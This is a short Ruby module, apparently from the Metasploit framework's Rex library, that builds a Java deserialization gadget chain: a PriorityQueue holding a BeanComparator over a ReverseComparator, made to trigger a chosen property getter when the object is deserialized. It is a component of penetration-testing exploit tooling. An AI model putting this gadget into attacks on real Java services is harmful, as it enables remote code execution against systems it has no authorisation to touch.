# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Beanutils
          def self.make_get_property(obj, property)
            revcomp = Model::JavaObject.new('Ljava/util/Collections$ReverseComparator;', {})
            comp = Model::JavaObject.new('Lorg/apache/commons/beanutils/BeanComparator;', 
                                  'comparator' => revcomp, 
                                  'property' => property)
            Model::JavaObject.new('Ljava/util/PriorityQueue;', 
                           'comparator' => comp, 
                           'elements' => [obj, obj])
          end
        end
      end
    end
  end
end
